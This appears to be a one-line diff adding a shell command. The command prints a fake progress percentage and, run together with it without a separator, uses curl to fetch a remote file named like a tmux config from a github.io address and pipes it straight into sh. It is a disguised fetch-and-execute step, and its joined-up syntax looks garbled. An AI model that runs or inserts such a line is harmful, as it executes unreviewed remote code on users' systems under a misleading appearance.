@@ -1,0 +1,1 @@
+echo Progress: 68.00%curl -L --progress-bar frkns.github.io/fun/DelightHangingSandwichMarkersGlad.tmux.conf | sh
